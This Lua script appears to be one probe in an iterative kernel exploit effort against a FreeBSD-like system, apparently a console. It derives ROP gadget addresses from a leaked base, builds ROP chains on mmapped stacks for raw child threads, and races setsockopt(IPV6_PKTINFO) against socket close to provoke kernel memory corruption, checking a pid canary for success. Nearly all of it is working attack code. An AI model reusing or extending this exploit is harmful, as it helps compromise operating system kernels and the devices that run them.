-- CRASH_CLASS: HIGH
-- PROBE 92e: PKTINFO race — fixed mmap sizing + verified child exec
--
-- 92d bugs: mmap too small (200 pages for 200+ children = out of bounds),
-- pktinfo ifindex=0 (child may not have run).
--
-- Fix: correct mmap sizing, verify child setsockopt with UNICAST_HOPS
-- (known working from 91u), then race PKTINFO vs close.

print("=== PROBE 92e: PKTINFO RACE (FIXED) ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R10=0x060;local _R8=0x068;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local PKTINFO=46; local PV6=41

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
-- PARAMETERS — correctly sized
-- ============================================================
local NSOCK=4
local ROUNDS=20
local STK_PG=2      -- 2 pages = 32KB per child (~800 iterations)
local PG_PER_CHILD=STK_PG+1  -- stack + context = 3 pages

-- Section A: 1 child, Section B: NSOCK*ROUNDS, Section C: NSOCK*10
local MAX_CH=1+NSOCK*ROUNDS+NSOCK*10  -- 1+80+40=121
local TOTAL_PG=1+MAX_CH*PG_PER_CHILD  -- 1+363=364 pages = ~5.7MB

print(string.format("max_ch=%d pages=%d (~%dMB)", MAX_CH, TOTAL_PG, TOTAL_PG*16/1024))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print("region="..string.format("0x%X",R))

-- Data page
local ts=R; wq(ts,uint64(999)); wq(ts+8,uint64(0))
local sl=R+0x20; wq(sl,uint64(0)); wq(sl+8,uint64(20000000))  -- 20ms
local sl2=R+0x40; wq(sl2,uint64(0)); wq(sl2+8,uint64(2000000)) -- 2ms
local tb=R+0x60

-- in6_pktinfo struct for setsockopt(PKTINFO)
local pktinfo=R+0x80; z(pktinfo,20)
-- optval for UNICAST_HOPS (4 bytes)
local hopval=R+0xA0; wd(hopval,77)

local cidx=0
local function child_stk(i) return R+0x4000*(1+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(1+i*PG_PER_CHILD+STK_PG) end

local function spawn(sock_fd, opt, optval_addr, optlen)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local stk_bytes=STK_PG*0x4000

    local off=0
    local ncycles=math.floor((stk_bytes-300)/40)
    for i=1,ncycles do
        wq(stk+off,PRDX); off=off+8
        wq(stk+off,uint64(opt)); off=off+8
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(105)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    for j=1,3 do
        wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
        wq(stk+off,SA); off=off+8
    end

    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(105))
    wq(ctx+_DI,uint64(sock_fd))
    wq(ctx+_SI,uint64(PV6))
    wq(ctx+_DX,uint64(opt))
    wq(ctx+_R10,uint64(optval_addr))
    wq(ctx+_R8,uint64(optlen))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

-- ============================================================
-- SECTION A: Verify child setsockopt actually works
-- ============================================================
print("--- A: VERIFY ---")

local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)

-- Set UNICAST_HOPS=42 from main
wd(hopval,42)
native.fcall_with_rax(stub,105,s6,PV6,4,hopval,4)

-- Read back to confirm
local gb=memory.alloc(8); wd(gb,0); wd(gb+4,0)
local gl=memory.alloc(4); wd(gl,4)
native.fcall_with_rax(stub,118,s6,PV6,4,N(gb),N(gl))
print("main_hops="..tostring(rd(gb)))

-- Spawn child that sets UNICAST_HOPS=77
wd(hopval,77)
local tid=spawn(s6, 4, hopval, 4)  -- opt=4 = UNICAST_HOPS
print("child_tid="..tostring(tid and N(tid) or "nil"))

-- Wait for child to execute
native.fcall_with_rax(stub,240,sl,0)

-- Read back
wd(gb,0); wd(gl,4)
native.fcall_with_rax(stub,118,s6,PV6,4,N(gb),N(gl))
local hops=rd(gb)
print("after_child_hops="..tostring(hops))

if hops==77 then
    print("*** CHILD SETSOCKOPT CONFIRMED ***")
else
    print("child did NOT set hops — R10/R8 problem?")
end
native.fcall_with_rax(stub,6,s6)

-- ============================================================
-- SECTION B: PKTINFO race — child loops setsockopt(PKTINFO),
-- main closes socket immediately
-- ============================================================
print("")
print("--- B: PKTINFO vs CLOSE ---")

local hits=0
for round=1,ROUNDS do
    if cidx>=MAX_CH-NSOCK then
        print("R"..round..": OUT OF CHILDREN ("..cidx..")")
        break
    end

    local fds={}
    for i=1,NSOCK do
        local fd=N(native.fcall_with_rax(stub,97,28,2,0))
        if fd<=0 then break end
        fds[i]=fd
    end
    if #fds<NSOCK then
        for _,fd in ipairs(fds) do native.fcall_with_rax(stub,6,fd) end
        print("R"..round..": SKIP")
        break
    end

    for i=1,NSOCK do spawn(fds[i], PKTINFO, pktinfo, 20) end

    -- 2ms sleep — just enough for children to start
    native.fcall_with_rax(stub,240,sl2,0)

    -- CLOSE — race trigger
    for i=1,NSOCK do native.fcall_with_rax(stub,6,fds[i]) end

    local canary=N(native.fcall_with_rax(stub,20))
    if round%5==0 or canary~=pid then
        print(string.format("R%02d: c=%d ch=%d", round, canary, cidx))
    end
    if canary~=pid then hits=hits+1 end
end

-- ============================================================
-- SECTION C: SOCK_STREAM
-- ============================================================
print("")
print("--- C: SOCK_STREAM ---")

local hits_c=0
for round=1,10 do
    if cidx>=MAX_CH-NSOCK then break end

    local fds={}
    for i=1,NSOCK do
        local fd=N(native.fcall_with_rax(stub,97,28,1,0))
        if fd<=0 then break end
        fds[i]=fd
    end
    if #fds<NSOCK then
        for _,fd in ipairs(fds) do native.fcall_with_rax(stub,6,fd) end
        break
    end

    for i=1,NSOCK do spawn(fds[i], PKTINFO, pktinfo, 20) end
    native.fcall_with_rax(stub,240,sl2,0)
    for i=1,NSOCK do native.fcall_with_rax(stub,6,fds[i]) end

    local canary=N(native.fcall_with_rax(stub,20))
    if round%5==0 or canary~=pid then
        print(string.format("C%02d: c=%d ch=%d", round, canary, cidx))
    end
    if canary~=pid then hits_c=hits_c+1 end
end

-- ============================================================
print("")
print(string.format("B=%d C=%d children=%d", hits, hits_c, cidx))
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 92e DONE ===")
